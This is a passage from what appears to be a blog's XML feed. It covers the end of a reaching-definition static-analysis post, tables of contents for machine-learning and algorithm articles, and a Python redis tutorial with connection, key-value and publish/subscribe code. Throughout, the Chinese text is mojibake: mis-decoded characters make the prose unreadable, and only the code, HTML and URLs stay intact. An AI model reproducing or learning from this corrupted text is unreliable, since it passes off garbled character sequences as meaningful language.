Analysis</code>ï¼ŒåŒ…æ‹¬å…¶<strong>å®šä¹‰ä¸ç†è§£ï¼Œåˆ†æè¿‡ç¨‹ï¼ˆç®—æ³•ï¼‰ï¼Œå®é™…ä¾‹å­</strong>ï¼Œå¯¹ä¸€äº›åŸºç¡€çš„æ¦‚å¿µä¹Ÿè¿›è¡Œäº†è¯¦ç»†çš„é˜è¿°ï¼Œä½†è¿˜æ˜¯æœ‰è®¸å¤šæ²¡èƒ½è®²è§£é€å½»çš„åœ°æ–¹ï¼Œå¦‚æœçœŸçš„å¯¹è¿™å—å†…å®¹æœ‰å…´è¶£çš„è¯ï¼Œå»ºè®®å»Bç«™çœ‹ä¸€éè€å¸ˆçš„è§†é¢‘ï¼Œä¼šæœ‰ä¸åŒçš„æ„Ÿæ‚Ÿå’Œç†è§£ã€‚è¿™å ‚è¯¾å¸¦ç»™æˆ‘æœ€å¤§çš„å¯å‘ï¼Œä¸»è¦æœ‰å‡ ç‚¹ï¼š</p><ol><li>ä¸“ä¸šæ€§çš„çŸ¥è¯†ï¼šæ•°æ®æµåˆ†æè¦åˆ†æä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆåˆ†æï¼Œå¦‚ä½•åˆ†æ</li><li>å¦‚ä½•å°†ä¸€ä¸ªåˆ†æé—®é¢˜å…·è±¡åˆ°å¯¹å®šä¹‰å’Œåˆ†æè¿‡ç¨‹çš„è®¾è®¡ï¼šåƒæœ¬æ–‡å°±æ˜¯ä¸ºäº†çŸ¥é“åœ¨ç¨‹åºæ‰§è¡Œè¿‡åï¼Œæ¯ä¸ªå®šä¹‰è¯­å¥çš„æœ‰æ•ˆæ€§ï¼Œä»¥ä¾¿æ‰¾å‡º<code>undefined variables</code>,è¦è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œè¦çŸ¥é“ç¨‹åºå—æ‰§è¡Œåå¯¹å®šä¹‰äº§ç”Ÿäº†ä»€ä¹ˆå½±å“ï¼Œä»¥åŠæ•°æ®æµæ±‡èšæ—¶å€™çš„å¤„ç†</li><li>è®¾è®¡åˆ†æè¿‡ç¨‹ï¼ˆç®—æ³•ï¼‰çš„å·§å¦™ä¹‹å¤„ï¼ŒåŒ…æ‹¬ç‰¹æ®Šçš„è¾¹ç•Œå¤„ç†å’Œå¯¹ç®—æ³•ç»ˆæ­¢çš„åˆ¤æ–­</li></ol><p>å…¶ä»–æ›´å¤šçš„å†…å®¹å¾…ä»¥åæœ‰æ–°çš„æ„Ÿæ‚Ÿä¹‹åå†æ·»åŠ è¿›æ¥ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><sup><a href="#fn_1" id="reffn_1">1</a></sup> :  <a href="https://www.bilibili.com/video/av95400721/?spm_id_from=333.788.b_765f64657363.2">å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹03ï¼ˆData Flow Analysis Iï¼‰_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>static_analysis</tag>
      
      <tag>reaching_definition_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€æœºå™¨å­¦ä¹ ã€‘ä¸“æ ç›®å½•</title>
    <link href="/article/14948.html"/>
    <url>/article/14948.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡è®°è½½äº†æˆ‘åœ¨å­¦ä¹ machine-learning(æœºå™¨å­¦ä¹ )è¿‡ç¨‹çš„æ„Ÿæ‚Ÿå’Œæ€è€ƒæ–‡ç« çš„æ‰€æœ‰æ ‡é¢˜å’Œé“¾æ¥ï¼ˆåŒ…æ‹¬ä¹‹å‰åœ¨CSDNåˆ›ä½œçš„æœºå™¨å­¦ä¹ æ–‡ç« ï¼‰å¯é€šè¿‡è¯¥ç›®å½•æ‰¾åˆ°ç³»åˆ—å¯¹åº”æ–‡ç« ï¼Œåç»­è¯¥æ–¹é¢çš„å†…å®¹ä¾ç„¶ä¼šæ›´æ–°åˆ°æœ¬ç›®å½•ã€‚</p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><ul><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101626181">æœºå™¨å­¦ä¹ ï¼šåŸºç¡€çŸ¥è¯†ï¼ˆçº¿æ€§åˆ†ç±»é—®é¢˜ï¼‰</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/104657019">æœºå™¨å­¦ä¹ ï¼šçŸ©é˜µã€å‘é‡æ±‚å¯¼ç†è§£</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/104951049">ã€æœºå™¨å­¦ä¹ åŸºç¡€ã€‘è¯¯å·®åˆ†æ</a></p></li></ul><h2 id="ç»å…¸æœºå™¨å­¦ä¹ ç®—æ³•"><a href="#ç»å…¸æœºå™¨å­¦ä¹ ç®—æ³•" class="headerlink" title="ç»å…¸æœºå™¨å­¦ä¹ ç®—æ³•"></a>ç»å…¸æœºå™¨å­¦ä¹ ç®—æ³•</h2><ul><li><p><a href="https://blog.csdn.net/GentleCP/article/details/99061426">å†³ç­–æ ‘ï¼šID3&amp;C4.5&amp;cartç®—æ³•ï¼ˆä»åŸç†åˆ°å®ç°-å°ç™½æ•™ç¨‹è¶…è¯¦ç»†ï¼‰</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/103791208">æœºå™¨å­¦ä¹ ï¼šçº¿æ€§(Fisher)åˆ¤åˆ«åˆ†æ</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102614817">éšé©¬å°”å¯å¤«æ¨¡å‹ç®€å•ç†è§£</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/108035696">ã€æœºå™¨å­¦ä¹ ã€‘é€»è¾‘å›å½’(LogisticRegression)åŸç†ä¸å®æˆ˜</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/108081657">ã€æœºå™¨å­¦ä¹ ã€‘å†³ç­–æ ‘å®æˆ˜ä¸åˆ†æ</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/108108808">ã€æœºå™¨å­¦ä¹ ã€‘æ”¯æŒå‘é‡æœº(SVM)åŸç†ä¸å®æˆ˜</a></p></li></ul><h2 id="æ·±åº¦å­¦ä¹ "><a href="#æ·±åº¦å­¦ä¹ " class="headerlink" title="æ·±åº¦å­¦ä¹ "></a>æ·±åº¦å­¦ä¹ </h2><ul><li><a href="https://blog.csdn.net/GentleCP/article/details/104984351">ã€æ·±åº¦å­¦ä¹ åŸºç¡€ã€‘ç®€å•æ˜“æ‡‚ç†è§£BPç®—æ³•</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>machine-learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine-learning</tag>
      
      <tag>toc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç®—æ³•è®¾è®¡ä¸åˆ†æã€‘ä¸“æ ç›®å½•</title>
    <link href="/article/21022.html"/>
    <url>/article/21022.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡è®°è½½äº†æˆ‘åœ¨å­¦ä¹ DSAA(æ•°æ®ç»“æ„ä¸ç®—æ³•)è¿‡ç¨‹çš„æ„Ÿæ‚Ÿå’Œæ€è€ƒæ–‡ç« çš„æ‰€æœ‰æ ‡é¢˜å’Œé“¾æ¥ï¼ˆåŒ…æ‹¬ä¹‹å‰åœ¨CSDNåˆ›ä½œçš„ç®—æ³•ä¸è®¾è®¡ä¸“æ æ–‡ç« ï¼‰å¯é€šè¿‡è¯¥ç›®å½•æ‰¾åˆ°ç®—æ³•è®¾è®¡ä¸åˆ†æç³»åˆ—å¯¹åº”æ–‡ç« ï¼Œåç»­è¯¥æ–¹é¢çš„å†…å®¹ä¾ç„¶ä¼šæ›´æ–°åˆ°æœ¬ç›®å½•</p><blockquote><p>2020/04/22ï¼š<a href="https://blog.csdn.net/GentleCP/article/details/105679148">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šå…³äºåç»­å†…å®¹çš„ä¸€äº›è¯´æ˜</a></p></blockquote><h2 id="åˆ†æ²»æ€æƒ³"><a href="#åˆ†æ²»æ€æƒ³" class="headerlink" title="åˆ†æ²»æ€æƒ³"></a>åˆ†æ²»æ€æƒ³</h2><ul><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101108413">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåˆ†æ²»æ€æƒ³ - å…¥é—¨</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101108695">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šæ·±å…¥ç†è§£å¿«é€Ÿæ’åº</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101512092">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåˆ†æ²»æ€æƒ³ï¼ˆ2ï¼‰- é€‰æ‹©é—®é¢˜ï¼ˆå¯¹å•ä¸ªæ•°ç»„å½’çº¦ï¼‰</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102212046">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåˆ†æ²»æ€æƒ³ï¼ˆ3ï¼‰- å¹³é¢æœ€è¿‘ç‚¹å¯¹å¯»æ‰¾é—®é¢˜ï¼ˆå¯¹ç‚¹é›†å½’çº¦ï¼‰</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102246489">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåˆ†æ²»æ€æƒ³ï¼ˆ4ï¼‰- å¿«é€Ÿå‚…ç«‹å¶å˜æ¢ï¼ˆå¯¹æ•°ç»„çš„å½’çº¦ï¼‰</a></p></li></ul><h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><ul><li><a href="https://blog.csdn.net/GentleCP/article/details/102504277">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåŠ¨æ€è§„åˆ’ - çŸ©é˜µé“¾å¼ç›¸ä¹˜é—®é¢˜</a></li><li><a href="https://blog.csdn.net/GentleCP/article/details/102779619">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåŠ¨æ€è§„åˆ’ï¼ˆ2ï¼‰ - åºåˆ—è”é…é—®é¢˜(æœ€ä¼˜å¯¹é½æ–¹æ¡ˆ)</a></li><li><a href="https://blog.csdn.net/GentleCP/article/details/102814327">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåŠ¨æ€è§„åˆ’ï¼ˆ3ï¼‰-åºåˆ—è”é…é—®é¢˜ï¼ˆä»¥ç®—ä»£å­˜ï¼‰</a></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102894420">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šåŠ¨æ€è§„åˆ’ï¼ˆ4ï¼‰- åºåˆ—è”é…é—®é¢˜ï¼ˆè§‚å¯Ÿå›æº¯è·¯å¾„ï¼‰</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/109443407">ã€ç®—æ³•è®¾è®¡ä¸åˆ†æã€‘åŠ¨æ€è§„åˆ’ - èƒŒåŒ…é—®é¢˜è¯¦è§£ï¼ˆåŸºç¡€èƒŒåŒ…ï¼‰</a></p><h2 id="è´ªå¿ƒç®—æ³•"><a href="#è´ªå¿ƒç®—æ³•" class="headerlink" title="è´ªå¿ƒç®—æ³•"></a>è´ªå¿ƒç®—æ³•</h2></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/103095884">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šè´ªå¿ƒç®—æ³• - æ’è¯¾é—®é¢˜ï¼ˆDPä¸è´ªå¿ƒçš„åŒºåˆ«ä¸åº”ç”¨ï¼‰</a></p></li><li><a href="https://blog.csdn.net/GentleCP/article/details/103099264">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šè´ªå¿ƒç®—æ³•ï¼ˆ2ï¼‰- æœ€çŸ­è·¯é—®é¢˜ï¼ˆDPåˆ°è´ªå¿ƒçš„ä¼˜åŒ–ï¼‰</a></li><li><a href="https://blog.csdn.net/GentleCP/article/details/103196262">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šDijkstraç®—æ³•ï¼ˆä»å®ç°åˆ°ä¼˜åŒ–ï¼‰</a>   </li></ul><h2 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h2><ul><li><a href="https://blog.csdn.net/GentleCP/article/details/106072413">ç®—æ³•è®¾è®¡ä¸åˆ†æï¼šäºŒå‰æ ‘é—®é¢˜çš„è§£å†³æ€è·¯</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>DSAA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toc</tag>
      
      <tag>DSAA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€redisã€‘pythonæ“ä½œä¸é¢‘é“å‘å¸ƒä¸è®¢é˜…</title>
    <link href="/article/37287.html"/>
    <url>/article/37287.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡è®²è¿°å¦‚ä½•ç”¨<code>python</code>è¿æ¥ä½¿ç”¨<code>redis</code>å’Œåˆ©ç”¨<code>redis</code>è¿›è¡Œé¢‘é“çš„è®¢é˜…å’Œæ¶ˆæ¯å‘å¸ƒï¼Œé»˜è®¤è¯»è€…å¯¹äº<code>redis</code>çš„åŸºæœ¬æ¦‚å¿µå’Œå¦‚ä½•åˆ›å»º<code>redis</code>æœåŠ¡å·²ç»çŸ¥æ™“ã€‚</p><h2 id="pythonæ“ä½œredis"><a href="#pythonæ“ä½œredis" class="headerlink" title="pythonæ“ä½œredis"></a>pythonæ“ä½œredis</h2><p>pythonæ“ä½œredisä¸»è¦åŒ…å«å‡ æ­¥ï¼š</p><ul><li>è¿æ¥redisæ•°æ®åº“</li><li><p>æ•°æ®çš„å¢åˆ æŸ¥æ”¹</p><h3 id="è¿æ¥redisæ•°æ®åº“"><a href="#è¿æ¥redisæ•°æ®åº“" class="headerlink" title="è¿æ¥redisæ•°æ®åº“"></a>è¿æ¥redisæ•°æ®åº“</h3></li><li><p>ç›´æ¥è¿æ¥<br>  <code>redis</code>æä¾›äº†<code>Redis</code>å’Œ<code>StrictRedis</code>ä¸¤ç§ç›´è¿<code>redis</code>çš„æ–¹å¼ï¼Œå‰è€…æ˜¯ä¸ºäº†å…¼å®¹2.xç‰ˆæœ¬ï¼Œä¸€èˆ¬æˆ‘ä»¬éƒ½ç”¨<code>StrictRedis</code></p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redisredis_conn <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>  <span class="token comment"># ä¸Šè¿°å‚æ•°éƒ½æ˜¯é»˜è®¤å€¼ï¼Œæ ¹æ®éœ€è¦ä¿®æ”¹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></li><li><code>ConnectionPool</code>è¿æ¥<br>  å®é™…ä¸Šæ¯ä¸€ä¸ª<code>StrictRedis</code>ç›´è¿éƒ½ä¼šåˆ›å»ºä¸€ä¸ª<code>ConnectionPool</code>ï¼Œå¹¶ä¸”åœ¨è¿æ¥æ–­å¼€æ—¶é”€æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™éƒ¨åˆ†å†…å®¹æ‰‹åŠ¨åˆ›å»ºï¼Œè¿æ¥æ± ä¼šé¢„å…ˆåˆ›å»ºå¤šä¸ªè¿æ¥ï¼Œå½“è¿›è¡Œredisæ“ä½œæ—¶ï¼Œç›´æ¥è·å–å·²ç»åˆ›å»ºå¥½çš„è¿æ¥è¿›è¡Œæ“ä½œã€‚å®Œæˆåï¼Œä¸ä¼šé‡Šæ”¾è¿™ä¸ªè¿æ¥ï¼Œè€Œæ˜¯è®©å…¶è¿”å›è¿æ¥æ± ï¼Œç”¨äºåç»­redisæ“ä½œï¼Œè¿™æ ·åœ¨é«˜å¹¶å‘çš„è¿æ¥ä¸­å°±èƒ½æé«˜æ€§èƒ½ã€‚  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redisconn_pool <span class="token operator">=</span> redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>redis_conn <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>conn_pool<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="å¢åˆ æŸ¥æ”¹"><a href="#å¢åˆ æŸ¥æ”¹" class="headerlink" title="å¢åˆ æŸ¥æ”¹"></a>å¢åˆ æŸ¥æ”¹</h3></li></ul><p>æ—¢ç„¶æ˜¯æ•°æ®åº“ï¼Œæ ¸å¿ƒå°±æ˜¯è¿™å‡ ä¸ªæ“ä½œï¼Œredisä¸­é‡‡ç”¨é”®å€¼å¯¹çš„æ–¹å¼å­˜å‚¨æ•°æ®ï¼Œå¯ä»¥æƒ³è±¡æˆä¸€ä¸ªå­—å…¸ã€‚</p><ul><li><p>æ·»åŠ æ•°æ®&amp;ä¿®æ”¹æ•°æ®<br>  åŒ…å«<code>set</code>å’Œ<code>mset</code>æ–¹æ³•ï¼Œåè€…æ˜¯å‰è€…çš„å¤šé‡ï¼Œç”¨äºä¸€æ¬¡è®¾ç½®å¤šä¸ªå€¼ã€‚ä¸‹é¢ç”¨å…·ä½“ä»£ç å±•ç¤ºï¼›</p><ul><li><p><code>set(name, value, ex=None, px=None, nx=False, xx=False)</code></p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data2'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span>ex<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># è®¾ç½®10ç§’è¶…æ—¶ï¼Œè¶…æ—¶åè‡ªåŠ¨åˆ é™¤è¯¥æ•°æ®ï¼Œexå•ä½ç§’ï¼Œpxå•ä½æ¯«ç§’</span>redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>nx<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># å½“`data`ä¸å­˜åœ¨æ—¶æ‰åˆ›å»º</span>redis_conn<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>xx<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># å½“`data`å­˜åœ¨æ—¶æ‰åˆ›å»º</span>data_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'data3'</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">,</span>    <span class="token string">'data4'</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">&#125;</span>redis_conn<span class="token punctuation">.</span>mset<span class="token punctuation">(</span>data_dict<span class="token punctuation">)</span>  <span class="token comment"># ä¸€æ¬¡è®¾ç½®å¤šä¸ªé”®å€¼</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬é€šå¸¸åªç”¨ç¬¬ä¸€æ¡ï¼Œå…¶ä»–çš„å‡ ä¸ªä¹Ÿäº†è§£ä¸€ä¸‹å³å¯</p></blockquote><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªç”¨äºåœ¨æ•°æ®åé¢æ·»åŠ æ–°æ•°æ®çš„æ–¹æ³•<code>append</code>ï¼Œå½“æ•°æ®ä¸å­˜åœ¨æ—¶æ–°å»ºï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æ·»åŠ åˆ°å·²æœ‰æ•°æ®å°¾éƒ¨ï¼Œè¿”å›å€¼æ˜¯æ•°æ®çš„é•¿åº¦</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">length <span class="token operator">=</span> redis_conn<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'666'</span><span class="token punctuation">)</span>  <span class="token comment"># data:b'10666',length:5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul></li><li><p>æŸ¥æ‰¾æ•°æ®<br>  åŒ…å«<code>get</code>å’Œ<code>mget</code>æ–¹æ³•ï¼Œåè€…ç”¨äºä¸€æ¬¡è·å–å¤šä¸ªã€‚æ³¨æ„è¿”å›çš„å€¼æ˜¯byteså¯¹è±¡ã€‚</p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">redis_conn<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>  <span class="token comment"># b'10' </span>query_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">,</span><span class="token string">'data2'</span><span class="token punctuation">,</span><span class="token string">'data3'</span><span class="token punctuation">,</span><span class="token string">'data4'</span><span class="token punctuation">]</span>redis_conn<span class="token punctuation">.</span>mget<span class="token punctuation">(</span>query_list<span class="token punctuation">)</span>  <span class="token comment"># [b'10', None, b'11', b'12']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></li><li>åˆ é™¤æ•°æ®<br>  <code>delete</code>æ–¹æ³•ï¼Œå…è®¸åˆ é™¤å•ä¸ªæˆ–åˆ é™¤å¤šä¸ªï¼ˆæ ¹æ®é”®ï¼‰  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">redis_conn<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>redis_conn<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">'data2'</span><span class="token punctuation">,</span><span class="token string">'data3'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div>ä¸Šé¢ä¸»è¦æ˜¯<code>string</code>ç±»å‹æ•°æ®åœ¨<code>redis</code>ä¸­çš„æ“ä½œï¼Œ<code>redis</code>è¿˜æ”¯æŒ<code>List</code>,<code>Hash</code>,<code>Set</code>ç­‰å¤šç§ç±»å‹ï¼Œå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡:<a href="https://www.cnblogs.com/jiyu-hlzy/p/11980427.html">Pythonå¯¹Rediså¢åˆ æ”¹æŸ¥</a>ã€‚</li></ul><h2 id="é¢‘é“å‘å¸ƒä¸è®¢é˜…"><a href="#é¢‘é“å‘å¸ƒä¸è®¢é˜…" class="headerlink" title="é¢‘é“å‘å¸ƒä¸è®¢é˜…"></a>é¢‘é“å‘å¸ƒä¸è®¢é˜…</h2><p><code>redis</code>å…è®¸å‘å¸ƒé¢‘é“ï¼Œé€šè¿‡é¢‘é“ä¼ è¾¾ä¿¡æ¯ï¼Œå…¶ä»–å¯¹è±¡å¯ä»¥è®¢é˜…è¯¥é¢‘é“ä»¥è·å–ç›¸åº”çš„ä¿¡æ¯ï¼Œç›´è§‚ä¸€ç‚¹çš„ç†è§£å°±æ˜¯<code>server</code>,<code>client</code>çš„<code>socket</code>é€šä¿¡ã€‚ä¸»è¦åˆ†ä¸º<code>å‘å¸ƒç«¯</code>å’Œ<code>è®¢é˜…ç«¯</code>ã€‚</p><h3 id="å‘å¸ƒç«¯"><a href="#å‘å¸ƒç«¯" class="headerlink" title="å‘å¸ƒç«¯"></a>å‘å¸ƒç«¯</h3><p>ä¾‹å¦‚æˆ‘ä»¬ç”¨<code>redis</code>åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡<code>publish</code>æ–¹æ³•å‘å¸ƒä¸€ä¸ªé¢‘é“ï¼ŒåŒæ—¶å¾€è¯¥é¢‘é“ä¸­è¾“é€ä¿¡æ¯ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redispool <span class="token operator">=</span> redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'chaopeng'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>pool<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"publish: >>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>publish<span class="token punctuation">(</span>channel<span class="token operator">=</span><span class="token string">'cctv'</span><span class="token punctuation">,</span> message<span class="token operator">=</span>msg<span class="token punctuation">)</span>    <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç»“æŸå‘å¸ƒ"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>å¯åŠ¨æ•ˆæœï¼š<br><img src="https://img-blog.csdnimg.cn/20200708124910352.png#pic_center =246x62" alt=""></p><h3 id="è®¢é˜…ç«¯"><a href="#è®¢é˜…ç«¯" class="headerlink" title="è®¢é˜…ç«¯"></a>è®¢é˜…ç«¯</h3><p>è®¢é˜…ç«¯è¦æƒ³è·å–å‘å¸ƒçš„ä¿¡æ¯ï¼Œéœ€è¦è®¢é˜…ç›¸åº”é¢‘é“ï¼Œç›¸å½“äºclientç›‘å¬äº†æŒ‡å®šç«¯å£ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redispool <span class="token operator">=</span> redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'chaopeng'</span><span class="token punctuation">)</span>redis_conn <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>pool<span class="token punctuation">)</span>p <span class="token operator">=</span> redis_conn<span class="token punctuation">.</span>pubsub<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>subscribe<span class="token punctuation">(</span><span class="token string">"cctv"</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> p<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ­£åœ¨ç›‘å¬é¢‘é“ï¼š&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'channel'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'message'</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token 